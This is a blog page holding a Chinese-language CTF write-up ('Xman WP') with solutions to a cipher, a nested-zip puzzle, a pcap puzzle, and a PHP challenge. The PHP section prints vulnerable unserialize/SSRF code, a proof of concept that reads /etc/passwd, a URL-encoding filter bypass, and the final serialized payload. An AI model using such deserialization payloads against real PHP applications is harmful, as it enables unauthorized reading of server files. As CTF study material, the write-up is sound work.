@@ -1,0 +1,607 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.3.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.3.0" color="#222">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Copy',
+      copy_success: 'Copied',
+      copy_failure: 'Copy failed'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="common_encrypt加密算法如下 1234567891011def encrypt(data,groupnums):    a=[]    b=[]    section=int(len(data)/groupnums)    for i in range(0,len(data),section):        a.append(data[i:i+section])    for i i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Xman WP">
+<meta property="og:url" content="http://yoursite.com/2019/08/10/xman_wp/index.html">
+<meta property="og:site_name" content="今日事，今日毕。">
+<meta property="og:description" content="common_encrypt加密算法如下 1234567891011def encrypt(data,groupnums):    a=[]    b=[]    section=int(len(data)/groupnums)    for i in range(0,len(data),section):        a.append(data[i:i+section])    for i i">
+<meta property="og:locale" content="en">
+<meta property="og:updated_time" content="2019-08-30T04:01:56.901Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Xman WP">
+<meta name="twitter:description" content="common_encrypt加密算法如下 1234567891011def encrypt(data,groupnums):    a=[]    b=[]    section=int(len(data)/groupnums)    for i in range(0,len(data),section):        a.append(data[i:i+section])    for i i">
+  <link rel="alternate" href="/atom.xml" title="今日事，今日毕。" type="application/atom+xml">
+  <link rel="canonical" href="http://yoursite.com/2019/08/10/xman_wp/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>Xman WP | 今日事，今日毕。</title>
+  <meta name="generator" content="Hexo 3.9.0">
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">今日事，今日毕。</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/10/xman_wp/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="entranquil">
+      <meta itemprop="description" content="From zero to zero day.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="今日事，今日毕。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">Xman WP
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              
+                
+              
+
+              <time title="Created: 2019-08-10 13:41:44" itemprop="dateCreated datePublished" datetime="2019-08-10T13:41:44+08:00">2019-08-10</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-08-30 12:01:56" itemprop="dateModified" datetime="2019-08-30T12:01:56+08:00">2019-08-30</time>
+              </span>
+            
+          
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine: </span>
+    
+    <a title="valine" href="/2019/08/10/xman_wp/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2019/08/10/xman_wp/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              
+              <span>3.2k</span>
+            </span>
+          
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              
+              <span>3 mins.</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="common-encrypt"><a href="#common-encrypt" class="headerlink" title="common_encrypt"></a>common_encrypt</h1><p>加密算法如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(data,groupnums)</span>:</span></span><br><span class="line">    a=[]</span><br><span class="line">    b=[]</span><br><span class="line">    section=int(len(data)/groupnums)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(data),section):</span><br><span class="line">        a.append(data[i:i+section])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(section):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(groupnums):</span><br><span class="line">            b.append(a[j][i])</span><br><span class="line">    cipher=(<span class="string">''</span>.join(chr(ord(b[i])^i) <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b))))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br></pre></td></tr></table></figure>
+
+<p>把groupnums设为1，再加密一次，得到字符串<br>f_l1angt{3crr3ysptt10n_g1!s}<br>因为有花括号，怀疑这是栅栏密码，肉眼观察发现k是2<br>手输flag提交</p>
+<h1 id="onion-secret"><a href="#onion-secret" class="headerlink" title="onion_secret"></a>onion_secret</h1><p>把jpg后缀改为zip<br>发现hint的问号用0-10某个数字后是解压密码<br>解压一层还有一层，于是写脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, zipfile</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    original_file = str(j) + <span class="string">"onion.zip"</span></span><br><span class="line">    original_file = zipfile.ZipFile(original_file, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(str(j) + <span class="string">'hint.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        password = f.read()</span><br><span class="line">    password = password.split(<span class="string">" "</span>)[<span class="number">2</span>:][<span class="number">0</span>]</span><br><span class="line">    position = password.find(<span class="string">'?'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        password = password[:position] + str(i) + password[position + <span class="number">1</span>:]</span><br><span class="line">        print(password)</span><br><span class="line">        original_file.setpassword(password.encode())</span><br><span class="line">        <span class="comment"># original_file = zipfile.ZipFile(original_file)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = original_file.read(<span class="string">"onion.zip"</span>)</span><br><span class="line">            <span class="keyword">with</span> open(str(j + <span class="number">1</span>) + <span class="string">"onion.zip"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">                f1.write(data)</span><br><span class="line"></span><br><span class="line">            hint = original_file.read(<span class="string">"hint.txt"</span>)</span><br><span class="line">            <span class="keyword">with</span> open(str(j + <span class="number">1</span>) + <span class="string">"hint.txt"</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">                f2.write(hint)</span><br><span class="line">            print(<span class="string">"hint"</span>)</span><br><span class="line">            j = j + <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>解包到剩下最后一层，手动爆破，获得flag</p>
+<h1 id="strange-ssid"><a href="#strange-ssid" class="headerlink" title="strange_ssid"></a>strange_ssid</h1><p>strings ctf.pcap | awk ‘{print $1}’| grep -E ‘^[A-Za-z0-9]+$’<br>得到一串正常字符串<br>提交字符串报错<br>添加flag{}标记提交，成功</p>
+<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><h2 id="过程分析"><a href="#过程分析" class="headerlink" title="过程分析"></a>过程分析</h2><p>打开拿到源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class Hello &#123;</span><br><span class="line">    protected $a;</span><br><span class="line"></span><br><span class="line">    function test() &#123;</span><br><span class="line">        $b = strpos($this-&gt;a, 'flag');</span><br><span class="line">        if($b) &#123;</span><br><span class="line">            die("Bye!");</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, $this-&gt;a);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, 5);</span><br><span class="line">        echo curl_exec($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        $this-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET["z"])) &#123;</span><br><span class="line">    unserialize($_GET["z"]);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现是ssrf+反序列化<br>其中反序列化比较简单，肯定会触发destruct<br>构造如下poc读取/etc/passwd</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hello</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $a=<span class="string">'file:///etc/passwd'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $b = strpos(<span class="keyword">$this</span>-&gt;a, <span class="string">'flag'</span>);</span><br><span class="line">        <span class="keyword">if</span>($b) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $c = curl_init();</span><br><span class="line">        curl_setopt($c, CURLOPT_URL, <span class="keyword">$this</span>-&gt;a);</span><br><span class="line">        curl_setopt($c, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($c, CURLOPT_CONNECTTIMEOUT, <span class="number">5</span>);</span><br><span class="line">        <span class="keyword">echo</span> curl_exec($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if (isset($_GET["z"])) &#123;</span></span><br><span class="line"><span class="comment">//     unserialize($_GET["z"]);</span></span><br><span class="line"><span class="comment">// &#125; else &#123;</span></span><br><span class="line"><span class="comment">//     highlight_file(__FILE__);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line">$x = <span class="keyword">new</span> Hello();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($x));</span><br></pre></td></tr></table></figure>
+
+<p>成功读取/etc/passwd</p>
+<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>想要读取flag，发现有一个过滤，即读取文件必须是flagxxx(以flag开头)<br>虽然可以使用file协议，但是不能直接读取file:///flag<br>这里使用url编码绕过<br>将flag进行编码为%2566lag即可绕过检测</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>?z=O%3A5%3A%22Hello%22%3A1%3A%7Bs%3A4%3A%22%00%2A%00a%22%3Bs%3A14%3A%22file%3A%2F%2F%2F%2566lag%22%3B%7D</p>
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/08/09/wooyun知识库/" rel="next" title="搭建wooyun知识库">
+                  <i class="fa fa-chevron-left"></i> 搭建wooyun知识库
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/09/07/pwn基础知识/" rel="prev" title="pwn基础知识，持续更新">
+                  pwn基础知识，持续更新 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="comments"></div>
+  
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#common-encrypt"><span class="nav-number">1.</span> <span class="nav-text">common_encrypt</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#onion-secret"><span class="nav-number">2.</span> <span class="nav-text">onion_secret</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#strange-ssid"><span class="nav-number">3.</span> <span class="nav-text">strange_ssid</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ezphp"><span class="nav-number">4.</span> <span class="nav-text">ezphp</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过程分析"><span class="nav-number">4.1.</span> <span class="nav-text">过程分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bypass"><span class="nav-number">4.2.</span> <span class="nav-text">bypass</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-number">4.3.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">entranquil</p>
+  <div class="site-description" itemprop="description">From zero to zero day.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span>
+        
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">tags</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      Friends
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://www.jagger2zr.com/" title="http://www.jagger2zr.com/" rel="noopener" target="_blank">jagger</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://lemonvegetablefish.github.io/" title="https://lemonvegetablefish.github.io/" rel="noopener" target="_blank">LVF</a>
+        </li>
+      
+        <li class="links-of-blogroll-item">
+          <a href="https://fitzbc.github.io/" title="https://fitzbc.github.io/" rel="noopener" target="_blank">fitzbc</a>
+        </li>
+      
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">entranquil</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.3.0</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
+<script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+<script src="/js/next-boot.js?v=7.3.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+<script>
+NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+  var GUEST = ['nick', 'mail', 'link'];
+  var guest = 'nick,mail,link';
+  guest = guest.split(',').filter(item => {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#comments',
+    verify: false,
+    notify: false,
+    appId: 'zPBxoDHjfriy4FO43ysmpu4P-gzGzoHsz',
+    appKey: 'L1WzWXACrIrcyGj60A3Crnfj',
+    placeholder: 'Just go go',
+    avatar: 'mm',
+    meta: guest,
+    pageSize: '10' || 10,
+    visitor: false,
+    lang: 'zh-cn' || 'zh-cn',
+    path: location.pathname
+  });
+}, window.Valine);
+</script>
+
+</body>
+</html>
